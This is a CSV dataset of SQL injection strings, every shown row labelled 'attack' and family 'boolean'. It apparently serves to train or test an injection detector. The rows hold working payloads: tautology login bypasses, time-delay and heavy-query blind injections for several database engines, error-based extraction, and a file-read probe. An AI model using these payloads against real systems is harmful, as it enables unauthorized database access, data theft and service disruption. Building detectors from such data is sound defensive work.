label,payload,family
attack," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",boolean
attack,admin'  )   or   (  '1'  =  '1'--,boolean
attack," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",boolean
attack,or 1/*,boolean
attack," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",boolean
attack,select * from users where id  =  1.%@ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1'   or 1  =  1 -- 1',boolean
attack,"admin""  )   or   (  ""1""  =  ""1""#",boolean
attack," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",boolean
attack,or 1  =  1,boolean
attack,""" or ""x""  =  ""x",boolean
attack, or 'something' like 'some%',boolean
attack,admin' or '1'  =  '1'--,boolean
attack,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",boolean
attack,’ or ‘1’  =  ’1,boolean
attack,admin'or 1  =  1 or ''  =  ',boolean
attack," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",boolean
attack," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,boolean
attack,or 'text'   =   n'text',boolean
attack," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",boolean
attack,  )   or true--,boolean
attack, or userid like '%,boolean
attack,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",boolean
attack,"admin"" or ""1""  =  ""1",boolean
attack,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",boolean
attack,""" or isNULL  (  1/0  )   /*",boolean
attack," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",boolean
attack,"admin"" or 1  =  1/*",boolean
attack," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",boolean
attack,hi' or 1  =  1 --,boolean
attack,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",boolean
attack,"admin"" or ""1""  =  ""1""#",boolean
attack,admin'  )   or '1'  =  '1,boolean
attack," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',boolean
attack,admin'  )   or '1'  =  '1'/*,boolean
attack," select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 <@$ or 1  =  1 -- 1,boolean
attack,x' or 1  =  1 or 'x'  =  'y,boolean
attack,  )   or   (  'x'  )    =    (  'x,boolean
attack,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,boolean
attack,or '1'  =  '1'--,boolean
attack," select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",boolean
attack,admin'  )   or   (  '1'  =  '1'#,boolean
attack,select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',boolean
attack,", or '1'  =  '1'",boolean
attack,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 + \+%$ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",boolean
attack,or a  =  a--,boolean
attack, or 'x'  =  'x,boolean
attack," select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",boolean
attack,"a' or 1  =  1, --",boolean
attack,select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,boolean
attack,"""  )   or   (  ""x""  )    =    (  ""x",boolean
attack,23 OR 1  =  1,boolean
attack,select * from users where id  =  1.<@$ or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',boolean
attack," select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",boolean
attack, or uname like '%,boolean
attack," select * from users where id  =  1 or ""  (  ;"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 %$ . or 1  =  1 -- 1,boolean
attack,"admin""  )   or ""1""  =  ""1""--",boolean
attack," select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,boolean
attack,select * from users where id  =  1 <@.. or 1  =  1 -- 1,boolean
attack,select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',boolean
attack,""" or 1  =  1--",boolean
attack,a' or 'a'   =   'a,boolean
attack,"admin""  )   or   (  ""1""  =  ""1""/*",boolean
attack," select * from users where id  =  1 or "".#"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",boolean
attack,"admin""  )   or ""1""  =  ""1""/*",boolean
attack," select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1",boolean
attack,hi' or 'a'  =  'a,boolean
attack,admin' or 1  =  1--,boolean
attack, or username is not NULL or username   =   ',boolean
attack,admin' or '1'  =  '1'/*,boolean
attack," select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",boolean
attack, and 1  =  0  )   union all,boolean
attack," select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""{{"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or "",?"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",boolean
attack," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",boolean
attack,1 or 1  =  1,boolean
attack," select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",boolean
attack,or 1  =  1#,boolean
attack," select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1",boolean
attack,select * from users where id  =  1 <@1$ or 1  =  1 -- 1,boolean
attack," select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",boolean
attack,"1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1%""  )   and 8024  =  3560--",boolean
attack,"1""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",boolean
attack,"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",boolean
attack,"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",boolean
attack,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",boolean
attack,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'uwep'  =  'uwep",boolean
attack,"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",boolean
attack,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",boolean
attack,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,boolean
attack,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",boolean
attack,"-7868""   )    )    or 9323  =  9323#",boolean
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib",boolean
attack,1%' and 4595  =  4595#,boolean
attack,"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929",boolean
attack,-7999  )   or 8422  =  1336,boolean
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",boolean
attack," end and    (    (   ""rqay"" like ""rqay",boolean
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  '%'  =  '",boolean
attack,"1%""  )   and 2006  =  2006",boolean
attack,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",boolean
attack,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao",boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",boolean
attack,"1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack," end and   (  ""qkkn"" like ""qkkn",boolean
attack,1  )   and 4595  =  4595#,boolean
attack,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",boolean
attack,"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",boolean
attack,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",boolean
attack,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",boolean
attack,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack," end and   (  ""vwbx""  =  ""vwbx",boolean
attack,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,-7562  )   or 8571  =  8571--,boolean
attack,"-3707""   )    )     )   or 8571  =  8571--",boolean
attack,1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",boolean
attack,"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,boolean
attack,"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  '",boolean
attack,"1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,1'  )   and   (  7603  =  3634  )  *3634,boolean
attack,"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  """,boolean
attack,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,boolean
attack,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",boolean
attack,1'  )   where 2753  =  2753 and   (  2739  =  8047  )  *8047--,boolean
attack,1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,boolean
attack,"1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,-7187' or 4159  =  7465,boolean
attack,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""tfok"" like ""tfok",boolean
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",boolean
attack,"1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",boolean
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt",boolean
attack,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",boolean
attack,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",boolean
attack,-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr",boolean
attack,1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,boolean
attack,"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,1' and 5967  =  4184#,boolean
attack,1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,boolean
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",boolean
attack,"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly",boolean
attack,"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,boolean
attack,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- kfqs",boolean
attack,1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'vhqm'  =  'vhqm,boolean
